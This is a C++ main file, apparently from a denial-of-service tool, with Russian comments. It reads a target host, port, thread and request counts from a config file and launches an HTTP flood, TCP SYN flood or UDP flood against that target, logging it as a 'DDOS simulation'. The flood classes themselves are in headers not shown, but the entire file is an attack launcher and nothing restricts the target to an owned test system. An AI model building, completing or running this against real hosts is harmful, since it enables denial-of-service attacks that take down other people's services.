#include <HttpFlood.h>
#include <TcpSynFlood.h>
#include <UdpFlood.h>
#include <Config.h>
#include <Logger.h>
#include <ReportGenerator.h>

int main() {
    try {
        // Загружаем конфигурацию из файла
        Config config("config.txt");

        // Читаем параметры из конфигурации
        const std::string targetHost = config.getValue("target_host");
        const uint16_t targetPort = static_cast<uint16_t>(std::stoi(config.getValue("target_port")));
        const size_t threadCount = static_cast<size_t>(std::stoul(config.getValue("thread_count")));
        const size_t requestCount = static_cast<size_t>(std::stoul(config.getValue("request_count")));
        const std::string attackType = static_cast<std::string>(config.getValue("attack_type"));

        // Логируем запуск
        Logger::log("Starting DDOS simulation...");
        Logger::log("Config loaded:");
        Logger::log("Target Host: " + targetHost);
        Logger::log("Target Port: " + std::to_string(targetPort));
        Logger::log("Thread Count: " + std::to_string(threadCount));
        Logger::log("Request Count: " + std::to_string(requestCount));
        Logger::log("Attack Type: " + attackType);


        // Выбор типа атаки
        if (attackType == "http") {
            Logger::log("Performing HTTP Flood attack...");
            HttpFlood httpFlood(targetHost, targetPort, threadCount, requestCount);
            httpFlood.start();
        } else if (attackType == "tcp_syn") {
            Logger::log("Performing TCP SYN Flood attack...");
            TcpSynFlood tcpSynFlood(targetHost, targetPort, threadCount, requestCount);
            tcpSynFlood.start();
        } else if (attackType == "udp") {
            Logger::log("Performing UDP Flood attack...");
            UdpFlood udpFlood(targetHost, targetPort, threadCount, requestCount);
            udpFlood.start();
        } else {
            throw std::runtime_error("Invalid attack type: " + attackType);
        }

        // Генерация отчёта
        Logger::log("Generating report...");
        ReportGenerator::generateReport("report.txt", "Attack completed successfully");

        // Завершаем
        Logger::log("DDOS simulation finished!");
    } catch (const std::exception& ex) {
        Logger::log(std::string("Error: ") + ex.what());
    }

    return 0;
}
